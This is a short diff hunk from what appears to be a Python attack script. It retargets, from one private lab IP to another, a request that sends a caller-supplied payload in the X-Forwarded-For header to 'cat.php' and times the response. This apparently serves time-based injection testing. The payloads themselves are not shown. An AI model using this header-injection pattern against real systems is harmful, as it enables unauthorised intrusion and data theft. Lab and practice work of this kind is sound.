@@ -25,7 +25,7 @@ def GET(Payload, R=[],Code=False):
 
 	T = time.time()
 
-	response = Req.get('http://192.168.1.187/cat.php', headers={ 	# ChangeTheURL
+	response = Req.get('http://192.168.199.130/cat.php', headers={ 	
 		'X-Forwarded-For': '''{}'''.format(Payload),
 	}, params=params, verify=False)
 
